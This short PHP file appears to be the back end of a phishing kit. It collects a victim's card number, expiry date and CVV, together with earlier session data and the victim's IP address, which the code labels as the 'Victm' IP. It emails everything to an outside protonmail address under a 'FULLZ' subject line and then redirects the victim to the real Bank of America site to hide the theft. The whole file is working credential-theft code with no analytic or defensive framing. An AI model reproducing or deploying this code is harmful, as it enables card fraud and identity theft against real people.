<?
session_start();
include'ip.php';
$ip = MDgetIp();
$message = $_SESSION['x2'];
$message .= "[+]CC NUM : ".$_POST['cc']."\n";
$message .= "[+]CC EXP : ".$_POST['ex']."\n";
$message .= "[+]CCV    : ".$_POST['cvv']."\n";
$message .= "[+]Victm Ip_Add: ".$ip."\n";
$message .= "[ - ] ==================| END |================== [ - ]\n";







	 


$praga=rand();
$praga=md5($praga);

$send = "onitjus@protonmail.com";
$subject = "XBOB FULLZ - INSTANT READY - [".$ip."]";
$headers = "From: Badexample@rezulta.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);


header("Location:https://bankofamerica.com");


	 



?>
